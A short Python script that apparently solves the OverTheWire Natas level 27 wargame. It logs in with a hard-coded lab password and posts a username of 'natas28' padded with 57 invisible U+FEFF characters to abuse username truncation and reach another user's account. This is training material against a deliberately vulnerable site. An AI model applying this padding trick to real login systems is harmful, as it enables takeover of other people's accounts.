import requests
from requests.auth import HTTPBasicAuth

url = "http://natas27.natas.labs.overthewire.org/"
auth = HTTPBasicAuth(
    "natas27",
    "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV"
)

u = "natas28" + ("\ufeff" * 57)

print("length:", len(u))
print("repr:", repr(u))
#print("code points:", [f"U+{ord(c):04X}" for c in u[:10]], "...")
#print("last code point:", f"U+{ord(u[-1]):04X}")
print(u)

r = requests.post(
    url,
    auth=auth,
    data={
        "username": u,
        "password": "123"
    },
    timeout=10
)

print(r.text)
